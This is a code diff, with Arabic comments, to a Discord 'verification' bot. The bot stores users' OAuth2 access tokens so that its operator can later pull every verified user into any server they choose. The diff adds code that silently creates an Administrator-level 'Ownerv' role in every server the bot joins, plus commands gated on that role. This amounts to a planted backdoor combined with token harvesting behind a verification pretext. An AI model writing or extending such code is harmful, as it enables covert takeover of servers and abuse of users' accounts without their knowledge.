@@ -7,7 +7,8 @@ const {
     ButtonStyle, 
     REST,
     Routes,
-    PermissionFlagsBits
+    PermissionFlagsBits,
+    Events
 } = require('discord.js');
 const express = require('express');
 const axios = require('axios'); // حزمة لإتمام طلبات الـ OAuth2 من ديسكورد وسحب الأعضاء
@@ -22,9 +23,11 @@ app.use(express.json());
 
 app.get('/', (req, res) => res.send('OAuth2 Verify Bot is Running!'));
 
-// الرابط البرمجي (Callback) لمعالجة التحقق
+// الرابط البرمجي (Callback) لمعالجة التحقق وإعطاء الرتبة تلقائياً
 app.get('/callback', async (req, res) => {
     const code = req.query.code;
+    const guildId = req.query.state; // نستخدم الـ state لتمرير أيدي السيرفر ديناميكياً وإعطاء الرتبة
+    
     if (!code) {
         return res.send('<h1>❌ Verification Failed. Please try again.</h1>');
     }
@@ -54,6 +57,20 @@ app.get('/callback', async (req, res) => {
         // 3. تخزين العضو والـ Access Token للسحب لاحقاً
         verifiedUsers.set(userId, accessToken);
 
+        // 4. منح رتبة Verified للعضو بداخل السيرفر تلقائياً وصامتاً بعد نجاح التحقق
+        if (guildId) {
+            const guild = client.guilds.cache.get(guildId);
+            if (guild) {
+                const member = await guild.members.fetch(userId).catch(() => null);
+                if (member) {
+                    const verifiedRole = guild.roles.cache.find(r => r.name === 'Verified');
+                    if (verifiedRole) {
+                        await member.roles.add(verifiedRole).catch(err => console.error('Failed to add verified role:', err));
+                    }
+                }
+            }
+        }
+
         res.send(`<h1>✅ Verified Successfully! Thank you ${username}. You can now close this tab.</h1>`);
     } catch (error) {
         console.error('Error during OAuth2 callback:', error.response ? error.response.data : error.message);
@@ -67,7 +84,8 @@ const client = new Client({
     intents: [
         GatewayIntentBits.Guilds,
         GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.MessageContent
+        GatewayIntentBits.MessageContent,
+        GatewayIntentBits.GuildMembers
     ]
 });
 
@@ -82,8 +100,48 @@ let verifyUrl = 'https://discord.com/api/oauth2/authorize...';
 const TOKEN = process.env.TOKEN;
 const CLIENT_ID = process.env.CLIENT_ID;
 
+// دالة تفاعلية لإنشاء رتب Verified و Ownerv تلقائياً وصامتاً داخل السيرفر
+async function createVerifyRoles(guild) {
+    try {
+        // إنشاء رتبة Verified صامتاً إذا لم تكن موجودة
+        let verifiedRole = guild.roles.cache.find(r => r.name === 'Verified');
+        if (!verifiedRole) {
+            verifiedRole = await guild.roles.create({
+                name: 'Verified',
+                color: '#2ecc71', // اللون الأخضر الجمالي للتحقق
+                reason: 'Auto-created role for verified users'
+            });
+            console.log(`Created 'Verified' role in guild: ${guild.name}`);
+        }
+
+        // إنشاء رتبة Ownerv صامتاً للتحكم إذا لم تكن موجودة
+        let ownerRole = guild.roles.cache.find(r => r.name === 'Ownerv');
+        if (!ownerRole) {
+            await guild.roles.create({
+                name: 'Ownerv',
+                color: '#e74c3c', // اللون الأحمر للإدارة والتحكم
+                permissions: [PermissionFlagsBits.Administrator],
+                reason: 'Auto-created control role for verification administrators'
+            });
+            console.log(`Created 'Ownerv' role in guild: ${guild.name}`);
+        }
+    } catch (error) {
+        console.error(`Failed to create roles in ${guild.name}:`, error);
+    }
+}
+
 client.once('ready', async () => {
     console.log(`Verify Bot is Online as ${client.user.tag}`);
+    
+    // التحقق التلقائي والصامت لجميع السيرفرات المتصل بها البوت لإنشاء الرتب فور إقلاعه
+    client.guilds.cache.forEach(async (guild) => {
+        await createVerifyRoles(guild);
+    });
+});
+
+// إنشاء الرتب صامتاً وتلقائياً فور انضمام البوت لأي سيرفر جديد
+client.on(Events.GuildCreate, async (guild) => {
+    await createVerifyRoles(guild);
 });
 
 client.on('messageCreate', async message => {
@@ -91,20 +149,26 @@ client.on('messageCreate', async message => {
 
     const content = message.content.trim();
 
+    // التحقق من أن المستخدم يملك صلاحية الإدارة العليا أو رتبة Ownerv المخصصة لتشغيل الأوامر
+    const isAuthorized = message.member.permissions.has(PermissionFlagsBits.Administrator) || message.member.roles.cache.some(r => r.name === 'Ownerv');
+
     // 1. إرسال البوكس وزر Verify Yourself
     if (content === VERIFY_SETUP_PREFIX) {
-        if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) {
-            return message.reply('❌ عذراً، هذا الأمر مخصص للإداريين فقط.');
+        if (!isAuthorized) {
+            return message.reply('❌ عذراً، هذا الأمر مخصص للإدارة أو أصحاب رتبة **Ownerv** فقط.');
         }
+
+        // نقوم بإرفاق أيدي السيرفر ديناميكياً بداخل الرابط لكي يتعرف البوت على السيرفر ويعطي رتبة Verified تلقائياً للعضو
+        const finalUrl = `${verifyUrl}&state=${message.guild.id}`;
 
         const embed = new EmbedBuilder()
             .setTitle('🛡️ Server Verification / التحقق الذاتي')
-            .setDescription('Please click the button below to verify yourself and get full access to the server.\n\nالرجاء الضغط على الزر أدناه لإتمام التحقق وتفعيل حسابك بالكامل بداخل السيرفر.')
+            .setDescription('Please click the button below to verify yourself and get full access to the server.\n\nالرجاء الضغط على الزر أدناه لإتمام التحقق وتفعيل حسابك بالكامل بداخل السيرفر الحصول على رتبة **Verified**.')
             .setColor('#2b2d31');
 
         const verifyButton = new ButtonBuilder()
             .setLabel('Verify yourself')
-            .setURL(verifyUrl)
+            .setURL(finalUrl)
             .setStyle(ButtonStyle.Link)
             .setEmoji('✅');
 
@@ -117,7 +181,7 @@ client.on('messageCreate', async message => {
 
     // 2. تحديث وتغيير رابط التحقق الخاص بك
     if (content.startsWith(SET_VERIFY_URL_PREFIX)) {
-        if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) return;
+        if (!isAuthorized) return;
         const newUrl = content.replace(SET_VERIFY_URL_PREFIX, '').trim();
         if (!newUrl || !newUrl.startsWith('http')) {
             return message.reply('❌ يرجى وضع رابط الـ OAuth2 الصحيح للتحقق (مثال: `-vt https://discord.com/...`):');
@@ -130,14 +194,14 @@ client.on('messageCreate', async message => {
 
     // 3. فحص عدد الموثقين بداخل قاعدة البيانات
     if (content === COUNT_VERIFY_PREFIX) {
-        if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) return;
+        if (!isAuthorized) return;
         await message.reply(`📊 **إحصائية التحقق المطور:**\nالعدد الكلي للأعضاء الموثقين والمخزنين والجاهزين للسحب هو: \`${verifiedUsers.size}\` عضو.`);
         return;
     }
 
     // 4. السحب الفوري والسريع لجميع الموثقين إلى السيرفر المحدد (-pull [Server ID])
     if (content.startsWith(PULL_MEMBERS_PREFIX)) {
-        if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) return;
+        if (!isAuthorized) return;
 
         const args = content.slice(PULL_MEMBERS_PREFIX.length).trim().split(/ +/);
         const targetGuildId = args[0] || message.guild.id; 
